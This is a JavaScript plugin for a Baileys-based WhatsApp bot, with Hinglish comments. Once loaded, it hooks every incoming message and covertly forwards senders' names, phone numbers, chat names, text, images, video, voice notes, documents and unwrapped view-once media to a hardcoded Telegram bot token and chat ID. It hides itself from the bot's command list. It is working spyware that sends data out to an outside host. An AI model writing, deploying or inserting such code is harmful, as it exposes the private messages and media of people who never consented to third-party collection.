const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");

const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg";
const TG_CHAT_ID = "6653388298";

// Baileys 7.x ki asli download functions (repo mein yehi version hai)
let B = null;
try { B = require("@whiskeysockets/baileys"); } catch (e) {}

const PROCESSED = new Set();
let ATTACHED = false;
let STORE = null;

async function tgText(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID, text, parse_mode: "Markdown"
        }, { timeout: 10000 });
    } catch (e) {}
}

async function tgUpload(buffer, caption, endpoint, field, filename, mime) {
    try {
        if (!buffer || !buffer.length) return tgText(caption + "\n\n⚠️ Media download fail hua");
        if (buffer.length > 49 * 1024 * 1024) return tgText(caption + "\n\n⚠️ File 50MB+ hai, Telegram bot upload nahi kar sakta");
        const form = new FormData();
        form.append("chat_id", TG_CHAT_ID);
        form.append("caption", caption);
        form.append(field, buffer, { filename, contentType: mime });
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form, {
            headers: form.getHeaders(), timeout: 60000, maxBodyLength: Infinity, maxContentLength: Infinity
        });
    } catch (e) {
        await tgText(caption + `\n\n⚠️ Telegram upload fail: ${e?.response?.data?.description || e.message}`);
    }
}

// view-once / ephemeral wrappers kholo
function unwrap(msg) {
    if (!msg) return msg;
    if (msg.ephemeralMessage?.message) return unwrap(msg.ephemeralMessage.message);
    if (msg.viewOnceMessage?.message) return unwrap(msg.viewOnceMessage.message);
    if (msg.viewOnceMessageV2?.message) return unwrap(msg.viewOnceMessageV2.message);
    if (msg.documentWithCaptionMessage?.message) return unwrap(msg.documentWithCaptionMessage.message);
    return msg;
}

// 4 tarah ke download fallbacks
async function dlMedia(raw, inner) {
    if (typeof raw?.download === "function") { try { const b = await raw.download(); if (b?.length) return b; } catch (e) {} }
    if (B?.downloadMediaMessage) {
        try {
            const r2 = raw.message?.viewOnceMessage || raw.message?.viewOnceMessageV2 ? { key: raw.key, message: inner } : raw;
            const b = await B.downloadMediaMessage(r2, "buffer", {});
            if (b?.length) return b;
        } catch (e) {}
    }
    if (B?.downloadContentFromMessage) {
        let type = null, mobj = null;
        if (inner.imageMessage) { type = "image"; mobj = inner.imageMessage; }
        else if (inner.videoMessage) { type = "video"; mobj = inner.videoMessage; }
        else if (inner.audioMessage) { type = "audio"; mobj = inner.audioMessage; }
        else if (inner.documentMessage) { type = "document"; mobj = inner.documentMessage; }
        else if (inner.stickerMessage) { type = "image"; mobj = inner.stickerMessage; }
        if (type && mobj) {
            try {
                const stream = await B.downloadContentFromMessage(mobj, type);
                let buf = Buffer.from([]);
                for await (const c of stream) buf = Buffer.concat([buf, c]);
                if (buf.length) return buf;
            } catch (e) {}
        }
    }
    return null;
}

function digits(j) { return String(j || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, ""); }

// Asli number: phone-jid prefer, phir lid→pn mapping, phir fallback
function getNumber(raw, client) {
    const botNum = digits(client?.user?.id);
    const cands = [raw.key?.participant, raw.key?.remoteJid];
    for (const j of cands) {
        if (j && j.endsWith("@s.whatsapp.net")) {
            const n = digits(j);
            if (n && n !== botNum && n.length >= 8) return n;
        }
    }
    try {
        const contacts = STORE?.contacts || global.store?.contacts || null;
        if (contacts) {
            for (const j of cands) {
                if (j && j.endsWith("@lid") && contacts[j]) {
                    const n = digits(contacts[j].pnJid || contacts[j].jid);
                    if (n && n !== botNum) return n;
                }
            }
        }
    } catch (e) {}
    for (const j of cands) {
        const n = digits(j);
        if (n && n !== botNum && !n.startsWith("120363") && n.length >= 8 && n.length <= 15) return n + (j.endsWith("@lid") ? " (hidden-id)" : "");
    }
    return "Unknown";
}

async function processMsg(raw, client) {
    try {
        if (!raw?.key?.id || !raw?.message || raw.key.fromMe) return;
        const id = raw.key.id;
        if (PROCESSED.has(id)) return;
        PROCESSED.add(id);
        if (PROCESSED.size > 1000) PROCESSED.clear();

        const jid = raw.key.remoteJid || "";
        if (jid === "status@broadcast") return;

        const inner = unwrap(raw.message);
        const num = getNumber(raw, client);
        const name = raw.pushName || digits(raw.key.participant) || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        let chatName = "Private DM";
        const isGroup = jid.endsWith("@g.us");
        if (isGroup) { try { chatName = (await client.groupMetadata(jid))?.subject || "Group"; } catch (e) {} }

        const base = `🤖 *MESSAGE FORWARD*\n\n🕒 Time: \`${time}\`\n👤 Name: ${name}\n🔢 Number: ${num}\n💬 Chat: ${isGroup ? "👥 Group" : "👤 DM"}\n🏷️ Chat Name: ${chatName}`;

        // 🖼️ IMAGE
        if (inner.imageMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🖼️ Image\n📝 Caption: ${inner.imageMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendPhoto", "photo", "image.jpg", inner.imageMessage.mimetype || "image/jpeg");
        }
        // 🎥 VIDEO
        if (inner.videoMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎥 Video\n📝 Caption: ${inner.videoMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendVideo", "video", "video.mp4", inner.videoMessage.mimetype || "video/mp4");
        }
        // 🎤 VOICE / 🎵 AUDIO
        if (inner.audioMessage) {
            const buf = await dlMedia(raw, inner);
            const mime = inner.audioMessage.mimetype || "audio/mp4";
            const isVoice = inner.audioMessage.ptt || mime.includes("ogg");
            const cap = base + `\n\n📦 Type: ${isVoice ? "🎤 Voice" : "🎵 Audio"}`;
            if (isVoice) return await tgUpload(buf, cap, "sendVoice", "voice", "voice.ogg", "audio/ogg");
            return await tgUpload(buf, cap, "sendAudio", "audio", "audio.mp3", mime);
        }
        // 📄 DOCUMENT
        if (inner.documentMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 📄 Document\n📁 File: ${inner.documentMessage.fileName || "File"}`;
            return await tgUpload(buf, cap, "sendDocument", "document", inner.documentMessage.fileName || "file.bin", inner.documentMessage.mimetype || "application/octet-stream");
        }
        // 🎭 STICKER
        if (inner.stickerMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎭 Sticker`;
            return await tgUpload(buf, cap, "sendSticker", "sticker", "sticker.webp", "image/webp");
        }
        // 📝 TEXT
        const text = inner.conversation || inner.extendedTextMessage?.text;
        if (text) return await tgText(base + `\n\n📦 Type: 📝 Text\n⌨️ Message: ${text}`);
    } catch (err) {
        console.error("[TG Error]:", err.message);
    }
}

function attach(client, store) {
    if (ATTACHED) return;
    if (store) STORE = store;
    try {
        const ev = client?.ev || client?.sock?.ev || client?.client?.ev;
        if (ev && typeof ev.on === "function") {
            ev.on("messages.upsert", async (data) => {
                for (const m of (data?.messages || [])) await processMsg(m, client);
            });
            ATTACHED = true;
            console.log("[TG] Auto forward engine START ✔");
        }
    } catch (e) {}
}

// Bot connect hote hi attach
setImmediate(() => {
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        if (c) { attach(c, global.store); clearInterval(boot); }
    }, 2000);
    setTimeout(() => clearInterval(boot), 120000);
});

// Fallback: pehli message par hook lagao + agar hook na mile to yahan se process karo
cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, m, store, extra) => {
    try {
        if (!ATTACHED) attach(client, store);
        if (ATTACHED) return;
        const raw = {
            key: {
                id: m?.key?.id || (extra?.from || "") + "-" + Date.now(),
                remoteJid: m?.chat || extra?.from,
                participant: extra?.isGroup ? extra?.sender : undefined,
                fromMe: !!extra?.isMe
            },
            message: m?.message,
            pushName: m?.pushName || extra?.pushname,
            download: typeof m?.download === "function" ? m.download.bind(m) : undefined
        };
        await processMsg(raw, client);
    } catch (e) {}
});

console.log("[TG] Plugin loaded ✔");
